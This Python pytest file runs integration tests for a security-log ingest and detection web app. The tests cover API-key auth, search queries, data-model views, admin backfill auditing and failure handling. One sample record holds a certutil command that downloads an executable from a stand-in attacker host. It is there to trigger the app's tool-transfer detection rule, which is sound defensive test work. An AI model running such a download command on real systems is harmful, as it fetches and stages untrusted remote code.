# Author : Krishnendu De
# Co-Author: Claude Fable 5.0
"""Real-PostgreSQL integration tests for the HTTP stack.

Drives the FastAPI app through a TestClient against a live database, so routing,
the lifespan bootstrap (schema init + CIM view DDL + detection-engine load), API-key
auth, and the synchronous ingest path are all exercised end-to-end. Runs only when
DB_DSN is set (see tests/conftest.py).

HISTORICAL NOTE, STILL WORTH READING BEFORE DEBUGGING AN HTML ROUTE. Starlette changed
`Jinja2Templates.TemplateResponse` to `(request, name, context)` and later removed the
old form; app/main.py called it as `(name, context)`, so on a modern Starlette every HTML
page route raised `TypeError: unhashable type: 'dict'` and returned 500. All 32 call
sites now pass the request first, which every Starlette in the supported range accepts.
If /datamodels, /coverage, /reports, /search and / start failing with 500 together, look
for a regression of that one signature rather than for several separate defects -- the
JSON routes (/health, /api/v1/*) would be unaffected, which is the tell.
"""
from __future__ import annotations

import time
from pathlib import Path

import pytest

pytestmark = pytest.mark.integration

SAMPLES = Path(__file__).resolve().parent.parent / "samples"

# A generic-JSON record whose message trips the ingress-tool-transfer rule.
SAMPLE = ('{"message": "certutil -urlcache -f http://evil.test/x.exe payload", '
          '"event.action": "download", "source.ip": "203.0.113.5"}')


def _client(clean_db):
    from starlette.testclient import TestClient

    from app.main import app
    return TestClient(app)


def _sample(name: str) -> str:
    """A shipped sample file, ingested through the API exactly as an operator would.

    The CIM tests use the real `windows_security.json` rather than a hand-rolled record
    because the membership term they exercise reads `raw['event_id']`, and that key only
    exists because app/parsers/windows_security.py writes it back (Decision 2b). A
    synthesised payload would prove the registry works and skip the parser fix entirely.
    """
    return (SAMPLES / name).read_text(encoding="utf-8")


def _await_backfill(c, db, timeout: float = 15.0) -> str:
    """Poll until the background membership backfill has FULLY finished, and return the
    state it reached.

    The admin route starts an asyncio task and redirects immediately, so there is nothing
    the caller can await. Waiting on the /health state alone is not enough: the job
    publishes `state='done'` and only THEN writes its `cim.backfill.finished` audit
    entry, so returning on the state would leave that last write racing the TestClient's
    lifespan shutdown and make the audit assertion intermittent. The audit row is the
    job's true last action, so both are required here. Bounded, so a task that never
    finishes fails the test instead of hanging the CI job.
    """
    deadline = time.monotonic() + timeout
    state = "running"
    while time.monotonic() < deadline:
        state = c.get("/health").json()["cim"]["backfill"]
        logged = any(r["action"] == "cim.backfill.finished" for r in db.recent_audit(50))
        if state in ("done", "error") and logged:
            return state
        time.sleep(0.05)
    return state


def _cim_view_names(db) -> set[str]:
    with db.pool().connection() as conn:
        rows = conn.execute(
            "SELECT viewname FROM pg_views WHERE schemaname = current_schema() "
            "AND viewname LIKE %s", (r"cim\_%",)).fetchall()
    return {r["viewname"] for r in rows}


def _drop_cim_views(db, names) -> None:
    """Remove the named `cim_<tag>` views so the next lifespan has to CREATE them.

    `clean_db` deliberately keeps the views of real models, so "the views exist" is true
    before any test in this file runs — inherited from whatever ran before. A test that
    means to prove STARTUP built them has to clear the ground first, or it is reading its
    predecessor's leftovers and would pass with `_init_cim()` deleted from the lifespan.
    """
    with db.pool().connection() as conn:
        for name in sorted(names):
            conn.execute(f"DROP VIEW IF EXISTS {name}")
        conn.commit()


def test_health_ok(clean_db):
    with _client(clean_db) as c:
        r = c.get("/health")
    assert r.status_code == 200 and r.json()["status"] == "ok"


def test_security_headers_present(clean_db):
    with _client(clean_db) as c:
        r = c.get("/health")
    assert r.headers.get("x-frame-options") == "DENY"
    assert r.headers.get("x-content-type-options") == "nosniff"
    assert "frame-ancestors 'none'" in r.headers.get("content-security-policy", "")


def test_coverage_scoreboard(clean_db):
    with _client(clean_db) as c:
        page = c.get("/coverage")
        # The heading is HTML-escaped in the rendered page (`MITRE ATT&amp;CK`), so
        # asserting the bare ampersand never matched. Match what the template emits.
        assert page.status_code == 200 and "MITRE ATT&amp;CK" in page.text
        rep = c.get("/coverage.json")
        assert rep.status_code == 200
        body = rep.json()
        assert body["attack"]["enterprise_covered"] > 0     # rules loaded at lifespan
        assert body["attack"]["ics_covered"] > 0
        assert body["atlas"]["covered"] == 0 and body["atlas"]["total"] > 0
        nav = c.get("/coverage/attack-navigator.json?domain=ics")
        assert nav.status_code == 200 and nav.json()["domain"] == "ics-attack"


def test_ingest_api_auth_and_end_to_end(clean_db):
    db = clean_db
    rec = db.create_api_key("ci-key")

    with _client(db) as c:
        # no key -> 401
        assert c.post("/api/v1/ingest?format=generic_json", content=SAMPLE).status_code == 401
        # disabled/bogus key -> 401
        assert c.post("/api/v1/ingest?format=generic_json", content=SAMPLE,
                      headers={"X-API-Key": "lo_bogus"}).status_code == 401
        # valid key -> 200 and the batch summary
        r = c.post("/api/v1/ingest?format=generic_json&filename=feed.json",
                   content=SAMPLE, headers={"X-API-Key": rec["key"]})
        assert r.status_code == 200
        body = r.json()
        assert body["total"] == 1 and body["inserted"] == 1 and body["source_type"] == "api"

    # the event was stored (and is full-text searchable) ...
    assert db.search({"q": "certutil"}, 50, 0)[1] == 1
    # ... and detection ran inline during ingest (lifespan loaded the engine)
    alerts, _ = db.recent_alerts({}, 50, 0)
    assert any(a["rule_id"] == "lo-ingress-tool-transfer" for a in alerts)


def test_reports_dashboard_navigator_and_csv(clean_db):
    db = clean_db
    rec = db.create_api_key("ci-key")
    with _client(db) as c:
        c.post("/api/v1/ingest?format=generic_json", content=SAMPLE,
               headers={"X-API-Key": rec["key"]})        # fires the ingress-tool rule (T1105)
        assert c.get("/").status_code == 200              # dashboard renders the charts
        r = c.get("/reports?days=14")
        assert r.status_code == 200 and "security report" in r.text.lower()
        nav = c.get("/reports/attack-navigator.json?days=14")
        assert nav.status_code == 200
        layer = nav.json()
        assert layer["domain"] == "enterprise-attack"
        assert any(t["techniqueID"] == "T1105" for t in layer["techniques"])
        csvr = c.get("/alerts.csv")
        assert csvr.status_code == 200 and csvr.text.startswith("id,created_at")


def test_saved_search_save_run_delete(clean_db):
    db = clean_db
    with _client(db) as c:
        # save a search: 303 back to the runnable URL (paging stripped)
        r = c.post("/searches", data={"name": "Fortinet denies", "path": "/search",
                                      "query": "vendor=fortinet&action=deny&page=4"},
                   follow_redirects=False)
        assert r.status_code == 303
        assert r.headers["location"] == "/search?vendor=fortinet&action=deny"

        # it now renders as a chip on the search page
        page = c.get("/search")
        assert page.status_code == 200 and "Fortinet denies" in page.text

    saved = db.list_saved_searches("")                       # owner '' when auth off
    assert len(saved) == 1 and saved[0]["path"] == "/search"

    with _client(db) as c:
        d = c.post(f"/searches/{saved[0]['id']}/delete", data={"path": "/search"},
                   follow_redirects=False)
        assert d.status_code == 303 and d.headers["location"] == "/search"
    assert db.list_saved_searches("") == []


def test_ingest_api_rejects_empty_and_unknown_format(clean_db):
    db = clean_db
    rec = db.create_api_key("ci-key")
    with _client(db) as c:
        h = {"X-API-Key": rec["key"]}
        assert c.post("/api/v1/ingest?format=generic_json", content="   ",
                      headers=h).status_code == 400
        assert c.post("/api/v1/ingest?format=no_such_parser", content=SAMPLE,
                      headers=h).status_code == 400


def test_loql_query_api(clean_db):
    db = clean_db
    rec = db.create_api_key("ci-key")
    h = {"X-API-Key": rec["key"]}
    with _client(db) as c:
        assert c.post("/api/v1/query", json={"query": "*"}).status_code == 401   # auth required
        # every malformed input is a clean 400, never a 500 (regressions from the verify pass):
        assert c.post("/api/v1/query", json={"query": 123}, headers=h).status_code == 400   # non-string
        assert c.post("/api/v1/query", json={"query": ["a"]}, headers=h).status_code == 400
        assert c.post("/api/v1/query", json={}, headers=h).status_code == 400               # missing
        assert c.post("/api/v1/query", json={"query": "| boguscmd"}, headers=h).status_code == 400
        deep = "a=1 | where " + "(" * 3000 + "1" + ")" * 3000
        assert c.post("/api/v1/query", json={"query": deep}, headers=h).status_code == 400  # fails closed
        # a valid query returns the result shape
        c.post("/api/v1/ingest?format=generic_json", content=SAMPLE, headers=h)
        r = c.post("/api/v1/query", json={"query": "* | stats count as n", "limit": 10}, headers=h)
        assert r.status_code == 200
        body = r.json()
        assert body["fields"] == ["n"] and body["rows"][0]["n"] >= 1


# --------------------------------------------------------------------------- #
#  CIM data models (Backbone 2) over HTTP                                     #
# --------------------------------------------------------------------------- #
def test_health_reports_the_cim_views_were_applied_at_startup(clean_db):
    """The lifespan must call `db.init_cim()`; without it the `cim_<tag>` views never
    exist and `SELECT * FROM cim_web` fails for every analyst who follows the docs.

    /health is the machine-readable statement of whether it worked -- and it is a JSON
    route, so unlike /datamodels it stays meaningful while the HTML pages are broken by
    the Starlette signature issue in this module's docstring.

    THE VIEWS ARE DROPPED BEFORE THE CLIENT STARTS. Without that, `expected <= views` is
    answered by views some earlier test left behind, and the only thing still under test is
    `st["views"] == len(expected)` -- a number the application computes about itself and
    reports, which a lifespan that never called `db.init_cim()` would not even produce.
    Clearing them first is what turns this into a statement about STARTUP.
    """
    from app import cim

    expected = {cim.view_name(m) for m in cim.get_registry().models}
    _drop_cim_views(clean_db, expected)
    assert not (expected & _cim_view_names(clean_db)), (
        "the CIM views survived an explicit DROP, so this test cannot tell a view the "
        "lifespan created from one it inherited from an earlier test")

    with _client(clean_db) as c:
        st = c.get("/health").json()["cim"]
    views = _cim_view_names(clean_db)

    assert st["enabled"] is True, (
        "CIM_ENABLED is false in this environment, so the lifespan skipped the view DDL "
        "and this test cannot say whether it works")
    assert st["error"] is None, (
        f"db.init_cim() raised during startup and the app carried on (by design, the "
        f"views are read-side only): {st['error']}")
    assert st["applied"] is True, (
        "the lifespan never applied the CIM view DDL. _init_cim() is supposed to run "
        "immediately after db.init_schema(), before every other initializer")
    assert st["views"] == len(expected), (
        f"startup applied {st['views']} views for {len(expected)} registered models")
    assert st["views_failed"] == 0, (
        "some model views could not be rebuilt at startup; db.init_cim applies each "
        "model in its own transaction and reports the ones that failed, so this is the "
        f"list to look at: {st['error']}")
    assert st["registry_version"] is not None, (
        "/health does not know the registry version. It is set by the lifespan's "
        "_require_cim_registry(), which runs before the database is even touched -- so "
        "None here means that call was removed and a malformed models.yaml would once "
        "again boot green")
    assert st["untagged_events"] == 0 and st["write_error"] is None, (
        f"the ingest path stored {st['untagged_events']} event(s) without CIM tags "
        f"({st['write_error']}); on a healthy registry that number is zero")
    assert expected <= views, (
        f"these views are missing from the database after startup: "
        f"{sorted(expected - views)}")


def test_datamodels_page_renders_the_registry(clean_db):
    """The analyst-facing reference page. It renders from the registry alone, so the only
    things that can break it are the route wiring and the template."""
    with _client(clean_db) as c:
        r = c.get("/datamodels")
    assert r.status_code == 200, (
        f"/datamodels returned {r.status_code}. If /, /coverage, /reports and /search are "
        "ALSO failing, suspect the Starlette `TemplateResponse` signature described in "
        "this module's docstring -- one defect in app/main.py, not a CIM defect")
    for token in ("Authentication", "Industrial", "cim_ics"):
        assert token in r.text, (
            f"/datamodels rendered but does not mention {token!r}; the page is supposed "
            "to list every model in the registry with its view name")


def test_api_query_over_a_cim_datamodel(clean_db):
    """Ingest -> tag -> `| datamodel` -> aggregate, entirely over HTTP. This is the
    round trip the roadmap's Backbone-2 exit criterion describes, and the only test in
    the suite where the parser write-back, the registry, the stored `cim_models` column
    and the LOQL compiler all have to be right at once."""
    db = clean_db
    rec = db.create_api_key("ci-key")
    h = {"X-API-Key": rec["key"]}
    with _client(db) as c:
        ing = c.post("/api/v1/ingest?format=windows_security&filename=win.json",
                     content=_sample("windows_security.json"), headers=h)
        assert ing.status_code == 200 and ing.json()["inserted"] == 2, (
            f"the Windows sample did not ingest cleanly: {ing.status_code} {ing.text}")

        r = c.post("/api/v1/query",
                   json={"query": "| datamodel Authentication | stats count by user",
                         "limit": 10}, headers=h)
        assert r.status_code == 200, (
            f"a datamodel query returned {r.status_code}: {r.text}. The compiler emits "
            "`cim_models @> ARRAY[%s]::text[]` with the tag BOUND, so this should never "
            "be a 500")
        body = r.json()
        assert body["fields"] == ["user", "count"], (
            f"the result columns are {body['fields']}; inside a data model the field "
            "vocabulary is the model's, so `user` (not user_name) is the label")
        got = {row["user"]: row["count"] for row in body["rows"]}
        assert got == {"CORP\\jdoe": 1, "CORP\\asmith": 1}, (
            f"the Authentication model matched {got}. Both sample events are Windows "
            "4625/4624 logons, so both must be tagged 'authentication' at ingest")

        bad = c.post("/api/v1/query", json={"query": "| datamodel NoSuchModel"}, headers=h)
        assert bad.status_code == 400, (
            f"an unknown data model returned {bad.status_code}: {bad.text}. It must be a "
            "400 naming the known models -- a 500 hides an operator typo, and an empty "
            "200 would read as 'there were no such events'")
        assert "NoSuchModel" in bad.json()["detail"], (
            f"the 400 does not name the model the analyst typed: {bad.json()['detail']}")


def test_admin_cim_backfill_is_role_gated_and_audited(clean_db):
    """`backfill_cim` rewrites rows across every partition, so the route is admin-only
    and audited at both ends (start and outcome).

    AUTH_ENABLED defaults to false, which makes `require_role` a no-op, so "role-gated"
    is untestable through HTTP unless the test turns auth on for its own duration. Two
    separate clients are used so the viewer's session cannot leak into the admin's.
    """
    db = clean_db
    from app import auth, main
    from app.config import settings

    db.create_user("cim-admin", auth.hash_password("adminpw"), "admin")
    db.create_user("cim-viewer", auth.hash_password("viewerpw"), "viewer")
    was_enabled = settings.auth_enabled
    object.__setattr__(settings, "auth_enabled", True)
    main._cim_backfill.update(state="idle", result=None, error=None)
    try:
        with _client(db) as c:
            login = c.post("/login", data={"username": "cim-viewer",
                                           "password": "viewerpw"},
                           follow_redirects=False)
            assert login.status_code == 303, (
                f"the viewer could not log in ({login.status_code}), so the role check "
                "below would pass for the wrong reason")
            denied = c.post("/admin/cim/backfill", follow_redirects=False)
        assert denied.status_code == 403, (
            f"a viewer got {denied.status_code} from POST /admin/cim/backfill; it must "
            "be 403 from require_role('admin'). A 303 means the auth middleware bounced "
            "the request to /login instead, which would also happen with no session at "
            "all and therefore proves nothing about the role gate")

        with _client(db) as c:
            c.post("/login", data={"username": "cim-admin", "password": "adminpw"},
                   follow_redirects=False)
            started = c.post("/admin/cim/backfill", follow_redirects=False)
            assert started.status_code == 303 and started.headers["location"] == "/admin", (
                f"the admin POST returned {started.status_code} -> "
                f"{started.headers.get('location')}; it must start the job and redirect "
                "immediately rather than hold the request open for a full-table pass")
            state = _await_backfill(c, db)
        assert state == "done", (
            f"the background backfill ended in state {state!r} (or never finished within "
            "the poll budget); see the app log for the exception, which the task records "
            "as 'error' and audits")
    finally:
        object.__setattr__(settings, "auth_enabled", was_enabled)
        main._cim_backfill.update(state="idle", result=None, error=None)

    actions = [r["action"] for r in db.recent_audit(50)]
    assert "cim.backfill" in actions, (
        f"the start of the backfill was not audited; audit actions seen: {actions}")
    assert "cim.backfill.finished" in actions, (
        f"the outcome of the backfill was not audited. The start entry cannot say how "
        f"many rows were retagged, which is the only interesting fact; seen: {actions}")


def test_admin_cim_backfill_refuses_a_second_concurrent_run(clean_db):
    """One pass at a time. A second click while one is in flight must be refused and
    audited, not queued -- two concurrent full-table UPDATE passes double the write load
    for no benefit. The in-flight state is set directly so the race is deterministic
    rather than dependent on a real backfill still running when the second POST lands."""
    db = clean_db
    from app import main

    main._cim_backfill.update(state="running", result=None, error=None)
    try:
        with _client(db) as c:
            r = c.post("/admin/cim/backfill", follow_redirects=False)
        assert r.status_code == 303
        assert main._cim_backfill["state"] == "running", (
            "the refused POST overwrote the state of the run that was already in flight")
    finally:
        main._cim_backfill.update(state="idle", result=None, error=None)

    actions = [x["action"] for x in db.recent_audit(50)]
    assert "cim.backfill.denied" in actions, (
        f"the refusal was not audited; audit actions seen: {actions}")
    assert "cim.backfill" not in actions, (
        f"a second backfill was started while one was running; seen: {actions}")


# --------------------------------------------------------------------------- #
#  CIM failure modes over HTTP: boot, /health, /datamodels                     #
# --------------------------------------------------------------------------- #
def _broken_registry(message: str = "duplicate key 'event_id' in the CIM registry"):
    """A `get_registry` that fails exactly the way a malformed models.yaml does."""
    from app.cim import CimError

    def boom(*_a, **_kw):
        raise CimError(message)
    return boom


def test_the_app_refuses_to_boot_when_the_cim_registry_will_not_load(clean_db,
                                                                     monkeypatch):
    """A models.yaml that does not parse must stop the process at startup.

    It used to do the opposite. `app.db` claimed to import the registry eagerly; it does
    not -- `get_registry()` parses lazily on first use, and nothing called it during
    startup, so the app booted, /health answered "ok", and the failure arrived at the
    first INSERT. On the upload path that is a 500. On the LIVE path it is silent total
    data loss: `streaming._flush` catches the exception, counts a flush error and drops
    the buffered events, for as long as the YAML stays broken.

    `db.get_registry` is patched (the name `db.validate_cim_registry` actually calls),
    so this exercises the real lifespan wiring rather than the guard in isolation.
    """
    from app import db
    from app.main import app
    from starlette.testclient import TestClient

    monkeypatch.setattr(db, "get_registry", _broken_registry())
    with pytest.raises(Exception) as excinfo:
        with TestClient(app):
            pass                              # startup alone is what is under test
    assert "duplicate key" in str(excinfo.value), (
        f"startup failed with {excinfo.value!r}, which does not carry the registry's own "
        "message. Whatever stopped the boot, it was not _require_cim_registry -- and the "
        "operator needs the YAML error, not a stack trace from some later initializer")


def test_health_reports_degraded_when_an_event_is_stored_without_its_cim_tags(
        clean_db, monkeypatch):
    """The end-to-end statement of the ingest rule, over HTTP.

    A registry that breaks while the process is running must cost the CIM tags and
    nothing else: the event is accepted, stored and searchable, and /health stops saying
    "ok" and says what is wrong and what to run. Previously the ingest raised, /health
    reported a healthy service throughout, and on the syslog path the events were gone.
    """
    db = clean_db
    rec = db.create_api_key("degraded-key")
    h = {"X-API-Key": rec["key"]}
    db.reset_cim_write_state()
    try:
        with _client(db) as c:
            healthy = c.get("/health").json()
            assert healthy["status"] == "ok" and healthy["degraded"] is None, (
                f"the baseline is already degraded, so this test proves nothing: "
                f"{healthy['degraded']}")

            # Signature-matched to `cim.match.cim_models_for(evt, registry=None, *,
            # tags=None)`: `db._cim_tags` calls it as `cim_models_for(evt, tags=tags)`, so
            # a double without the keyword-only `tags` raises TypeError rather than the
            # CimError this test is simulating. `_cim_tags` catches both, so the failure
            # would be invisible here and only surface as the wrong `write_error` text.
            def boom(evt, registry=None, *, tags=None):
                from app.cim import CimError
                raise CimError("models.yaml broke while the process was running")

            monkeypatch.setattr(db, "cim_models_for", boom)
            ing = c.post("/api/v1/ingest?format=generic_json&filename=feed.json",
                         content=SAMPLE, headers=h)
            body = c.get("/health").json()

        assert ing.status_code == 200 and ing.json()["inserted"] == 1, (
            f"ingest returned {ing.status_code} {ing.text} while the registry was "
            "broken. The event must be ACCEPTED and stored untagged: the alternative is "
            "an exception into streaming._flush, which discards the whole buffer")
        assert db.search({"q": "certutil"}, 50, 0)[1] == 1, (
            "the event is not in the store. Whatever /health says, an ingest path that "
            "loses events over a YAML defect is the only unacceptable outcome")
        assert body["status"] == "degraded", (
            f"/health reports status={body['status']!r} while events are being stored "
            "without their model tags. A constant 'ok' is what let this hide")
        assert body["cim"]["untagged_events"] == 1, (
            f"/health reports {body['cim']['untagged_events']} untagged event(s) after "
            "one was stored untagged")
        assert "backfill" in " ".join(body["degraded"] or []), (
            f"the degraded reasons are {body['degraded']}; they must tell the operator "
            "to fix models.yaml and run the membership backfill, because the stored rows "
            "stay untagged until they do")
    finally:
        monkeypatch.undo()
        db.reset_cim_write_state()


def test_datamodels_explains_a_broken_registry_instead_of_returning_500(clean_db,
                                                                       monkeypatch):
    """/datamodels is where an operator goes to find out what broke, so it must survive
    the thing it exists to explain.

    Every other fragile read on the page was already guarded -- `_cim_stamp` wraps
    `db.cim_status()` so a database that predates the CIM tables still renders -- but
    `cim.get_registry()` on the first line was not, so the page survived a database
    outage and died with a 500 on a registry defect, while its docstring claimed it
    "renders from the registry alone".
    """
    from app import cim

    with _client(clean_db) as c:
        monkeypatch.setattr(cim, "get_registry", _broken_registry())
        r = c.get("/datamodels")

    assert r.status_code == 200, (
        f"/datamodels returned {r.status_code} on an unloadable registry. A 500 on the "
        "diagnostics page leaves the operator with nothing but the log")
    assert "models.yaml" in r.text, (
        "the page rendered but does not mention app/cim/models.yaml, so it does not say "
        "what is broken -- which makes it no more useful than the 500 it replaced")
